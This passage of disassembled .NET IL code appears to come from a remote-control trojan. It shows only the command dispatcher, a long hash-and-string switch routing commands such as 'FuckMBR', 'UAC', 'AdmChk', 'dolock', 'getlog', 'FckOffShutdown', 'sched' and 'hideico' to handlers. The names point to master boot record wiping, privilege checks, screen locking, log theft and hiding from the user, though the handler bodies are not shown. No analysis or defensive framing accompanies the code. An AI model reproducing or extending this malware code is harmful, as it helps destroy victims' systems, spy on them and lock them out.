      IL_0d7e:  beq        IL_1674

      IL_0d83:  ldloc.s    V_8
      IL_0d85:  ldc.i4     0x77651492
      IL_0d8a:  beq        IL_12f3

      IL_0d8f:  ldloc.s    V_8
      IL_0d91:  ldc.i4     0x7930d042
      IL_0d96:  beq        IL_1366

      IL_0d9b:  br         IL_266b

      IL_0da0:  ldloc.s    V_8
      IL_0da2:  ldc.i4     0x7ada1982
      IL_0da7:  bgt.un.s   IL_0dc6

      IL_0da9:  ldloc.s    V_8
      IL_0dab:  ldc.i4     0x79fa82c1
      IL_0db0:  beq        IL_11df

      IL_0db5:  ldloc.s    V_8
      IL_0db7:  ldc.i4     0x7ada1982
      IL_0dbc:  beq        IL_1155

      IL_0dc1:  br         IL_266b

      IL_0dc6:  ldloc.s    V_8
      IL_0dc8:  ldc.i4     0x7ceb65c9
      IL_0dcd:  beq        IL_10e2

      IL_0dd2:  ldloc.s    V_8
      IL_0dd4:  ldc.i4     0x7e57da31
      IL_0dd9:  beq        IL_1127

      IL_0dde:  ldloc.s    V_8
      IL_0de0:  ldc.i4     0x7e931998
      IL_0de5:  beq        IL_1549

      IL_0dea:  br         IL_266b

      IL_0def:  ldloc.s    V_8
      IL_0df1:  ldc.i4     0x82931fe4
      IL_0df6:  bgt.un.s   IL_0e47

      IL_0df8:  ldloc.s    V_8
      IL_0dfa:  ldc.i4     0x80931cbe
      IL_0dff:  bgt.un.s   IL_0e1e

      IL_0e01:  ldloc.s    V_8
      IL_0e03:  ldc.i4     0x7f931b2b
      IL_0e08:  beq        IL_151b

      IL_0e0d:  ldloc.s    V_8
      IL_0e0f:  ldc.i4     0x80931cbe
      IL_0e14:  beq        IL_158e

      IL_0e19:  br         IL_266b

      IL_0e1e:  ldloc.s    V_8
      IL_0e20:  ldc.i4     0x81931e51
      IL_0e25:  beq        IL_1560

      IL_0e2a:  ldloc.s    V_8
      IL_0e2c:  ldc.i4     0x824a7884
      IL_0e31:  beq        IL_16b9

      IL_0e36:  ldloc.s    V_8
      IL_0e38:  ldc.i4     0x82931fe4
      IL_0e3d:  beq        IL_15bc

      IL_0e42:  br         IL_266b

      IL_0e47:  ldloc.s    V_8
      IL_0e49:  ldc.i4     0x8593249d
      IL_0e4e:  bgt.un.s   IL_0e6d

      IL_0e50:  ldloc.s    V_8
      IL_0e52:  ldc.i4     0x8493230a
      IL_0e57:  beq        IL_14ed

      IL_0e5c:  ldloc.s    V_8
      IL_0e5e:  ldc.i4     0x8593249d
      IL_0e63:  beq        IL_15ea

      IL_0e68:  br         IL_266b

      IL_0e6d:  ldloc.s    V_8
      IL_0e6f:  ldc.i4     0x896383b3
      IL_0e74:  beq        IL_1224

      IL_0e79:  ldloc.s    V_8
      IL_0e7b:  ldc.i4     0x89f84633
      IL_0e80:  beq        IL_106f

      IL_0e85:  ldloc.s    V_8
      IL_0e87:  ldc.i4     0x8a3461c8
      IL_0e8c:  beq        IL_12ae

      IL_0e91:  br         IL_266b

      IL_0e96:  ldloc.s    V_8
      IL_0e98:  ldc.i4     0xc186b71e
      IL_0e9d:  bgt.un     IL_0f49

      IL_0ea2:  ldloc.s    V_8
      IL_0ea4:  ldc.i4     0xa88e8460
      IL_0ea9:  bgt.un.s   IL_0efa

      IL_0eab:  ldloc.s    V_8
      IL_0ead:  ldc.i4     0x8ff84fa5
      IL_0eb2:  bgt.un.s   IL_0ed1

      IL_0eb4:  ldloc.s    V_8
      IL_0eb6:  ldc.i4     0x8de4c4c7
      IL_0ebb:  beq        IL_113e

      IL_0ec0:  ldloc.s    V_8
      IL_0ec2:  ldc.i4     0x8ff84fa5
      IL_0ec7:  beq        IL_1086

      IL_0ecc:  br         IL_266b

      IL_0ed1:  ldloc.s    V_8
      IL_0ed3:  ldc.i4     0x955d335d
      IL_0ed8:  beq        IL_13ab

      IL_0edd:  ldloc.s    V_8
      IL_0edf:  ldc.i4     0x9f0a2c69
      IL_0ee4:  beq        IL_1394

      IL_0ee9:  ldloc.s    V_8
      IL_0eeb:  ldc.i4     0xa88e8460
      IL_0ef0:  beq        IL_1338

      IL_0ef5:  br         IL_266b

      IL_0efa:  ldloc.s    V_8
      IL_0efc:  ldc.i4     0xbf6b5498
      IL_0f01:  bgt.un.s   IL_0f20

      IL_0f03:  ldloc.s    V_8
      IL_0f05:  ldc.i4     0xba4ba8a6
      IL_0f0a:  beq        IL_13c2

      IL_0f0f:  ldloc.s    V_8
      IL_0f11:  ldc.i4     0xbf6b5498
      IL_0f16:  beq        IL_120d

      IL_0f1b:  br         IL_266b

      IL_0f20:  ldloc.s    V_8
      IL_0f22:  ldc.i4     0xbf86b3f8
      IL_0f27:  beq        IL_141e

      IL_0f2c:  ldloc.s    V_8
      IL_0f2e:  ldc.i4     0xc086b58b
      IL_0f33:  beq        IL_147a

      IL_0f38:  ldloc.s    V_8
      IL_0f3a:  ldc.i4     0xc186b71e
      IL_0f3f:  beq        IL_13f0

      IL_0f44:  br         IL_266b

      IL_0f49:  ldloc.s    V_8
      IL_0f4b:  ldc.i4     0xc686befd
      IL_0f50:  bgt.un.s   IL_0fa1

      IL_0f52:  ldloc.s    V_8
      IL_0f54:  ldc.i4     0xc386ba44
      IL_0f59:  bgt.un.s   IL_0f78

      IL_0f5b:  ldloc.s    V_8
      IL_0f5d:  ldc.i4     0xc286b8b1
      IL_0f62:  beq        IL_1407

      IL_0f67:  ldloc.s    V_8
      IL_0f69:  ldc.i4     0xc386ba44
      IL_0f6e:  beq        IL_14d6

      IL_0f73:  br         IL_266b

      IL_0f78:  ldloc.s    V_8
      IL_0f7a:  ldc.i4     0xc486bbd7
      IL_0f7f:  beq        IL_13d9

      IL_0f84:  ldloc.s    V_8
      IL_0f86:  ldc.i4     0xc50bf85f
      IL_0f8b:  beq        IL_1013

      IL_0f90:  ldloc.s    V_8
      IL_0f92:  ldc.i4     0xc686befd
      IL_0f97:  beq        IL_14a8

      IL_0f9c:  br         IL_266b

      IL_0fa1:  ldloc.s    V_8
      IL_0fa3:  ldc.i4     0xd60c1322
      IL_0fa8:  bgt.un.s   IL_0fc4

      IL_0faa:  ldloc.s    V_8
      IL_0fac:  ldc.i4     0xc90bfeab
      IL_0fb1:  beq        IL_1058

      IL_0fb6:  ldloc.s    V_8
      IL_0fb8:  ldc.i4     0xd60c1322
      IL_0fbd:  beq.s      IL_102a

      IL_0fbf:  br         IL_266b

      IL_0fc4:  ldloc.s    V_8
      IL_0fc6:  ldc.i4     0xd70c14b5
      IL_0fcb:  beq.s      IL_1041

      IL_0fcd:  ldloc.s    V_8
      IL_0fcf:  ldc.i4     0xf967d5e7
      IL_0fd4:  beq        IL_11f6

      IL_0fd9:  ldloc.s    V_8
      IL_0fdb:  ldc.i4     0xfb0c4d61
      IL_0fe0:  bne.un     IL_266b

      IL_0fe5:  ldloc.s    V_24
      IL_0fe7:  ldstr      "~"
      IL_0fec:  ldc.i4.0
      IL_0fed:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0ff2:  brfalse    IL_1715

      IL_0ff7:  br         IL_266b

      IL_0ffc:  ldloc.s    V_24
      IL_0ffe:  ldstr      "!"
      IL_1003:  ldc.i4.0
      IL_1004:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1009:  brfalse    IL_171f

      IL_100e:  br         IL_266b

      IL_1013:  ldloc.s    V_24
      IL_1015:  ldstr      "@"
      IL_101a:  ldc.i4.0
      IL_101b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1020:  brfalse    IL_172f

      IL_1025:  br         IL_266b

      IL_102a:  ldloc.s    V_24
      IL_102c:  ldstr      "S"
      IL_1031:  ldc.i4.0
      IL_1032:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1037:  brfalse    IL_174f

      IL_103c:  br         IL_266b

      IL_1041:  ldloc.s    V_24
      IL_1043:  ldstr      "R"
      IL_1048:  ldc.i4.0
      IL_1049:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_104e:  brfalse    IL_1766

      IL_1053:  br         IL_266b

      IL_1058:  ldloc.s    V_24
      IL_105a:  ldstr      "L"
      IL_105f:  ldc.i4.0
      IL_1060:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1065:  brfalse    IL_177d

      IL_106a:  br         IL_266b

      IL_106f:  ldloc.s    V_24
      IL_1071:  ldstr      "W7"
      IL_1076:  ldc.i4.0
      IL_1077:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_107c:  brfalse    IL_1794

      IL_1081:  br         IL_266b

      IL_1086:  ldloc.s    V_24
      IL_1088:  ldstr      "W1"
      IL_108d:  ldc.i4.0
      IL_108e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1093:  brfalse    IL_17b7

      IL_1098:  br         IL_266b

      IL_109d:  ldloc.s    V_24
      IL_109f:  ldstr      "XB"
      IL_10a4:  ldc.i4.0
      IL_10a5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_10aa:  brfalse    IL_17c1

      IL_10af:  br         IL_266b

      IL_10b4:  ldloc.s    V_24
      IL_10b6:  ldstr      "HT"
      IL_10bb:  ldc.i4.0
      IL_10bc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_10c1:  brfalse    IL_17cd

      IL_10c6:  br         IL_266b

      IL_10cb:  ldloc.s    V_24
      IL_10cd:  ldstr      "ST"
      IL_10d2:  ldc.i4.0
      IL_10d3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_10d8:  brfalse    IL_17e4

      IL_10dd:  br         IL_266b

      IL_10e2:  ldloc.s    V_24
      IL_10e4:  ldstr      "HD"
      IL_10e9:  ldc.i4.0
      IL_10ea:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_10ef:  brfalse    IL_17fb

      IL_10f4:  br         IL_266b

      IL_10f9:  ldloc.s    V_24
      IL_10fb:  ldstr      "SD"
      IL_1100:  ldc.i4.0
      IL_1101:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1106:  brfalse    IL_1812

      IL_110b:  br         IL_266b

      IL_1110:  ldloc.s    V_24
      IL_1112:  ldstr      "hideico"
      IL_1117:  ldc.i4.0
      IL_1118:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_111d:  brfalse    IL_1829

      IL_1122:  br         IL_266b

      IL_1127:  ldloc.s    V_24
      IL_1129:  ldstr      "showico"
      IL_112e:  ldc.i4.0
      IL_112f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1134:  brfalse    IL_1840

      IL_1139:  br         IL_266b

      IL_113e:  ldloc.s    V_24
      IL_1140:  ldstr      "OC"
      IL_1145:  ldc.i4.0
      IL_1146:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_114b:  brfalse    IL_1857

      IL_1150:  br         IL_266b

      IL_1155:  ldloc.s    V_24
      IL_1157:  ldstr      "CD"
      IL_115c:  ldc.i4.0
      IL_115d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1162:  brfalse    IL_186e

      IL_1167:  br         IL_266b

      IL_116c:  ldloc.s    V_24
      IL_116e:  ldstr      "TogDesk"
      IL_1173:  ldc.i4.0
      IL_1174:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1179:  brfalse    IL_1885

      IL_117e:  br         IL_266b

      IL_1183:  ldloc.s    V_24
      IL_1185:  ldstr      "dolock"
      IL_118a:  ldc.i4.0
      IL_118b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1190:  brfalse    IL_188f

      IL_1195:  br         IL_266b

      IL_119a:  ldloc.s    V_24
      IL_119c:  ldstr      "unlock"
      IL_11a1:  ldc.i4.0
      IL_11a2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_11a7:  brfalse    IL_18fc

      IL_11ac:  br         IL_266b

      IL_11b1:  ldloc.s    V_24
      IL_11b3:  ldstr      "Flip"
      IL_11b8:  ldc.i4.0
      IL_11b9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_11be:  brfalse    IL_1964

      IL_11c3:  br         IL_266b

      IL_11c8:  ldloc.s    V_24
      IL_11ca:  ldstr      "mirror"
      IL_11cf:  ldc.i4.0
      IL_11d0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_11d5:  brfalse    IL_19db

      IL_11da:  br         IL_266b

      IL_11df:  ldloc.s    V_24
      IL_11e1:  ldstr      "Invert"
      IL_11e6:  ldc.i4.0
      IL_11e7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_11ec:  brfalse    IL_1a34

      IL_11f1:  br         IL_266b

      IL_11f6:  ldloc.s    V_24
      IL_11f8:  ldstr      "Flashbang"
      IL_11fd:  ldc.i4.0
      IL_11fe:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1203:  brfalse    IL_1a8a

      IL_1208:  br         IL_266b

      IL_120d:  ldloc.s    V_24
      IL_120f:  ldstr      "LightsOut"
      IL_1214:  ldc.i4.0
      IL_1215:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_121a:  brfalse    IL_1ae0

      IL_121f:  br         IL_266b

      IL_1224:  ldloc.s    V_24
      IL_1226:  ldstr      "HClock"
      IL_122b:  ldc.i4.0
      IL_122c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1231:  brfalse    IL_1b33

      IL_1236:  br         IL_266b

      IL_123b:  ldloc.s    V_24
      IL_123d:  ldstr      "SClock"
      IL_1242:  ldc.i4.0
      IL_1243:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1248:  brfalse    IL_1c22

      IL_124d:  br         IL_266b

      IL_1252:  ldloc.s    V_24
      IL_1254:  ldstr      "HStart"
      IL_1259:  ldc.i4.0
      IL_125a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_125f:  brfalse    IL_1d11

      IL_1264:  br         IL_266b

      IL_1269:  ldloc.s    V_24
      IL_126b:  ldstr      "SStart"
      IL_1270:  ldc.i4.0
      IL_1271:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1276:  brfalse    IL_1eb6

      IL_127b:  br         IL_266b

      IL_1280:  ldloc.s    V_24
      IL_1282:  ldstr      "nbrowse"
      IL_1287:  ldc.i4.0
      IL_1288:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_128d:  brfalse    IL_1edb

      IL_1292:  br         IL_266b

      IL_1297:  ldloc.s    V_24
      IL_1299:  ldstr      "fbrowse"
      IL_129e:  ldc.i4.0
      IL_129f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_12a4:  brfalse    IL_1eef

      IL_12a9:  br         IL_266b

      IL_12ae:  ldloc.s    V_24
      IL_12b0:  ldstr      "newmouse"
      IL_12b5:  ldc.i4.0
      IL_12b6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_12bb:  brfalse    IL_1efe

      IL_12c0:  br         IL_266b

      IL_12c5:  ldloc.s    V_24
      IL_12c7:  ldstr      "insane"
      IL_12cc:  ldc.i4.0
      IL_12cd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_12d2:  brfalse    IL_1f19

      IL_12d7:  br         IL_266b

      IL_12dc:  ldloc.s    V_24
      IL_12de:  ldstr      "getlog"
      IL_12e3:  ldc.i4.0
      IL_12e4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_12e9:  brfalse    IL_1f34

      IL_12ee:  br         IL_266b

      IL_12f3:  ldloc.s    V_24
      IL_12f5:  ldstr      "boing"
      IL_12fa:  ldc.i4.0
      IL_12fb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1300:  brfalse    IL_1fb3

      IL_1305:  br         IL_266b

      IL_130a:  ldloc.s    V_24
      IL_130c:  ldstr      "rainbowz"
      IL_1311:  ldc.i4.0
      IL_1312:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1317:  brfalse    IL_2011

      IL_131c:  br         IL_266b

      IL_1321:  ldloc.s    V_24
      IL_1323:  ldstr      "Locke"
      IL_1328:  ldc.i4.0
      IL_1329:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_132e:  brfalse    IL_2084

      IL_1333:  br         IL_266b

      IL_1338:  ldloc.s    V_24
      IL_133a:  ldstr      "UAC"
      IL_133f:  ldc.i4.0
      IL_1340:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1345:  brfalse    IL_209b

      IL_134a:  br         IL_266b

      IL_134f:  ldloc.s    V_24
      IL_1351:  ldstr      "sched"
      IL_1356:  ldc.i4.0
      IL_1357:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_135c:  brfalse    IL_2137

      IL_1361:  br         IL_266b

      IL_1366:  ldloc.s    V_24
      IL_1368:  ldstr      "feitan"
      IL_136d:  ldc.i4.0
      IL_136e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1373:  brfalse    IL_2167

      IL_1378:  br         IL_266b

      IL_137d:  ldloc.s    V_24
      IL_137f:  ldstr      "FuckMBR"
      IL_1384:  ldc.i4.0
      IL_1385:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_138a:  brfalse    IL_217e

      IL_138f:  br         IL_266b

      IL_1394:  ldloc.s    V_24
      IL_1396:  ldstr      "FuckMBRNR"
      IL_139b:  ldc.i4.0
      IL_139c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_13a1:  brfalse    IL_2241

      IL_13a6:  br         IL_266b

      IL_13ab:  ldloc.s    V_24
      IL_13ad:  ldstr      "AdmChk"
      IL_13b2:  ldc.i4.0
      IL_13b3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_13b8:  brfalse    IL_22f2

      IL_13bd:  br         IL_266b

      IL_13c2:  ldloc.s    V_24
      IL_13c4:  ldstr      "FckOffShutdown"
      IL_13c9:  ldc.i4.0
      IL_13ca:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_13cf:  brfalse    IL_239e

      IL_13d4:  br         IL_266b

      IL_13d9:  ldloc.s    V_24
      IL_13db:  ldstr      "btnMC"
      IL_13e0:  ldc.i4.0
      IL_13e1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_13e6:  brfalse    IL_23b5

      IL_13eb:  br         IL_266b

      IL_13f0:  ldloc.s    V_24
      IL_13f2:  ldstr      "btnMD"
      IL_13f7:  ldc.i4.0
      IL_13f8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_13fd:  brfalse    IL_23c9

      IL_1402:  br         IL_266b

      IL_1407:  ldloc.s    V_24
      IL_1409:  ldstr      "btnME"
      IL_140e:  ldc.i4.0
      IL_140f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1414:  brfalse    IL_23dd

      IL_1419:  br         IL_266b

      IL_141e:  ldloc.s    V_24
      IL_1420:  ldstr      "btnMF"
      IL_1425:  ldc.i4.0
      IL_1426:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_142b:  brfalse    IL_23f1

      IL_1430:  br         IL_266b

      IL_1435:  ldloc.s    V_24
      IL_1437:  ldstr      "btnMCs"
      IL_143c:  ldc.i4.0
      IL_143d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1442:  brfalse    IL_2405

      IL_1447:  br         IL_266b

      IL_144c:  ldloc.s    V_24
      IL_144e:  ldstr      "btnMDs"
      IL_1453:  ldc.i4.0
      IL_1454:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1459:  brfalse    IL_2419

      IL_145e:  br         IL_266b

      IL_1463:  ldloc.s    V_24
      IL_1465:  ldstr      "btnMFs"
      IL_146a:  ldc.i4.0
      IL_146b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1470:  brfalse    IL_242d

      IL_1475:  br         IL_266b

      IL_147a:  ldloc.s    V_24
      IL_147c:  ldstr      "btnMG"
      IL_1481:  ldc.i4.0
      IL_1482:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1487:  brfalse    IL_2441

      IL_148c:  br         IL_266b

      IL_1491:  ldloc.s    V_24
      IL_1493:  ldstr      "btnMGs"
      IL_1498:  ldc.i4.0
      IL_1499:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_149e:  brfalse    IL_2455

      IL_14a3:  br         IL_266b

      IL_14a8:  ldloc.s    V_24
      IL_14aa:  ldstr      "btnMA"
      IL_14af:  ldc.i4.0
      IL_14b0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_14b5:  brfalse    IL_2469

      IL_14ba:  br         IL_266b

      IL_14bf:  ldloc.s    V_24
      IL_14c1:  ldstr      "btnMAs"
      IL_14c6:  ldc.i4.0
      IL_14c7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_14cc:  brfalse    IL_247d

      IL_14d1:  br         IL_266b

      IL_14d6:  ldloc.s    V_24
      IL_14d8:  ldstr      "btnMB"
      IL_14dd:  ldc.i4.0
      IL_14de:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_14e3:  brfalse    IL_2491

      IL_14e8:  br         IL_266b

      IL_14ed:  ldloc.s    V_24
      IL_14ef:  ldstr      "btnHC"
      IL_14f4:  ldc.i4.0
      IL_14f5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_14fa:  brfalse    IL_24a5

      IL_14ff:  br         IL_266b

      IL_1504:  ldloc.s    V_24
      IL_1506:  ldstr      "btnHCs"
      IL_150b:  ldc.i4.0
      IL_150c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1511:  brfalse    IL_24b9

      IL_1516:  br         IL_266b

      IL_151b:  ldloc.s    V_24
      IL_151d:  ldstr      "btnHD"
      IL_1522:  ldc.i4.0
      IL_1523:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1528:  brfalse    IL_24cd

      IL_152d:  br         IL_266b

      IL_1532:  ldloc.s    V_24
      IL_1534:  ldstr      "btnHDs"
      IL_1539:  ldc.i4.0
      IL_153a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_153f:  brfalse    IL_24e1

      IL_1544:  br         IL_266b

      IL_1549:  ldloc.s    V_24
      IL_154b:  ldstr      "btnHE"
      IL_1550:  ldc.i4.0
      IL_1551:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1556:  brfalse    IL_24f5

      IL_155b:  br         IL_266b

      IL_1560:  ldloc.s    V_24
      IL_1562:  ldstr      "btnHF"
      IL_1567:  ldc.i4.0
      IL_1568:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_156d:  brfalse    IL_2509

      IL_1572:  br         IL_266b

      IL_1577:  ldloc.s    V_24
      IL_1579:  ldstr      "btnHFs"
      IL_157e:  ldc.i4.0
      IL_157f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1584:  brfalse    IL_251d

      IL_1589:  br         IL_266b

      IL_158e:  ldloc.s    V_24
      IL_1590:  ldstr      "btnHG"
      IL_1595:  ldc.i4.0
      IL_1596:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_159b:  brfalse    IL_2531

      IL_15a0:  br         IL_266b

      IL_15a5:  ldloc.s    V_24
      IL_15a7:  ldstr      "btnHGs"
      IL_15ac:  ldc.i4.0
      IL_15ad:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_15b2:  brfalse    IL_2545

      IL_15b7:  br         IL_266b

      IL_15bc:  ldloc.s    V_24
      IL_15be:  ldstr      "btnHA"
      IL_15c3:  ldc.i4.0
      IL_15c4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_15c9:  brfalse    IL_2559

      IL_15ce:  br         IL_266b

      IL_15d3:  ldloc.s    V_24
